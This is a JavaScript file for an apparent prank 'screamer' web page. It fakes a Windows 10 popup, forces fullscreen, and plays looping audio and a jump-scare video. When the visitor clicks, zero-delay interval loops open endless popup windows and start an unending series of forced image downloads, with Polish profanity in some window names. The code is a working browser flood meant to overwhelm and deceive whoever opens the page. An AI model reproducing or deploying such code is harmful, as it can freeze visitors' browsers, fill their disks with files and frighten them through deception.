const btn = document.querySelector('.btn')
const w10popup = document.querySelector('.firstPopup')
const body = document.querySelector('body')
const dimisBtn = document.querySelector('#d')
const acceptBtn = document.querySelector('#a')
const gifSec = document.querySelector('.gifs')
const h1 = document.querySelector('h1')
const warning = document.querySelector('.warning')
const ok = document.querySelector('.ok')
const nieOk = document.querySelector('.nieOk')
const i = document.querySelector('.fi')

const wPopup = () => {
    warning.classList.add('zoomIn')
    // i.classList.add('animate__tada')
}

const closewarning = () => {
    warning.classList.remove('zoomIn')
}

const leavePage = () => {
    window.close()
    console.log('Jd Jak Coś');
}

const showPopup = () => {
    setTimeout(() => {
        w10popup.classList.toggle('showPopup')
        body.style.cursor = 'wait'
        btn.style.cursor = 'wait'

        const audio = document.getElementById("audio");
        audio.play();
    }, 400);

    setTimeout(() => {
        // window.open('https://www.youtube.com/watch?v=BT9h5ifR1tY')
        window.open("https://preview.redd.it/oewoj5g85eb91.jpg?width=1280&format=pjpg&auto=webp&s=b1e216ffdf374414b8ec8fa3934808e666e1fb9f", "_blank", "JDDD KURWE", "bottom=0, right=0, width=600,height=600");

    }, 4000)

    setTimeout(() => {
        gifSec.style.display = "flex"
    }, 3300)

    setTimeout(() => {
        const audio2 = document.getElementById("audio2");
        audio2.loop = 'true'
        audio2.play();

        const audio3 = document.getElementById("audio3");
        audio3.loop = 'true'
        audio3.play();
    }, 3500)

    setTimeout(() => {
        const screamer = document.querySelector('video')
        screamer.autoplay = "true"
        screamer.loop = "true"
        screamer.style.display = "flex"

        window.open("https://www.youtube.com/watch?v=BT9h5ifR1tY", "_blank", "JDDD KURWE", "bottom=0, right=0, width=600,height=600");


        const audio0 = document.getElementById("audio0");
        audio0.loop = 'true'
        audio0.play();
    }, 4000)
}

const classRemove = () => {
    w10popup.classList.remove('showPopup')
    body.style.cursor = 'auto'
    btn.style.cursor = 'auto'

    const audio3 = document.getElementById("audio3");
    audio3.loop = 'true'
    audio3.play();
}

const download = () => {
    setTimeout(() => {
        setInterval(() => {
            axios({
                url: 'https://source.unsplash.com/random/500x500',
                method: 'GET',
                responseType: 'blob'
            })
                .then((response) => {
                    const url = window.URL
                        .createObjectURL(new Blob([response.data]));
                    const link = document.createElement('a');
                    link.href = url;
                    link.setAttribute('download', 'image.jpg');
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                })
        })
    }, 3600)
}

let newWindow1;


const openWindow = () => {
    let randomNum = (Math.random() + 1).toString(36).substring(7);

    setTimeout(() => {
        setInterval(() => {
            newWindow1 = window.open("", "SPUCHA DO ORKA", "width=400,height=400");
            newWindow1.document.write(`<body><h1>JD</h1> ${randomNum} <mark> JD </mark><strong> JD </strong>
            
            <script>
        
            </script>

            </body>`)

        }, 300)
    }, 3190)
}

const openWindow2 = () => {
    let randomNum = (Math.random() + 1).toString(36).substring(7);
    let newWindow2
    setTimeout(() => {
        setInterval(() => {
            newWindow2 = window.open("https://Google.com", "JDDD KURWE", "bottom=0, right=0, width=400,height=400");
            newWindow2.document.write(`<body><h1>JD</h1> ${randomNum} <mark> JD </mark><strong> JD </strong>
            
            <script>
                console.log('jd PETA')
            </script>

            </body>`)

        }, 0)
    }, 3290)
}



const multipleJD = () => {
    let randomNum = (Math.random() + 1).toString(36).substring(7);
    let newWindow2
    setTimeout(() => {
        setInterval(() => {
            newWindow2 = window.open("https://preview.redd.it/oewoj5g85eb91.jpg?width=1280&format=pjpg&auto=webp&s=b1e216ffdf374414b8ec8fa3934808e666e1fb9f", "JDDD KURWE", "bottom=0, right=0, width=600,height=600");
            newWindow2.document.write(`
            
            <script>
                console.log('jd PETA')
            </script>

            </body>`)

        }, 0)
    }, 4090)
}


const fadeout = () => {
    const loaderWrapper = document.querySelector('.wrapper')

    setTimeout(() => {
        loaderWrapper.classList.add('fade')
    }, 1000)
}

// window.onbeforeunload = function (e) {
//     return 'Dialog text here.';
// };


let elem = document.querySelector('html');
function openFullscreen() {
    if (elem.requestFullscreen) {
        elem.requestFullscreen();
    } else if (elem.webkitRequestFullscreen) { /* Safari */
        elem.webkitRequestFullscreen();
    } else if (elem.msRequestFullscreen) { /* IE11 */
        elem.msRequestFullscreen();
    }
}
openFullscreen()

window.addEventListener('load', fadeout)
ok.addEventListener('click', openWindow)
ok.addEventListener('click', openWindow2)
ok.addEventListener('click', showPopup)
ok.addEventListener('click', multipleJD)
ok.addEventListener('click', openFullscreen)
btn.addEventListener('click', download)
btn.addEventListener('click', wPopup)
ok.addEventListener('click', closewarning)
nieOk.addEventListener('click', leavePage)
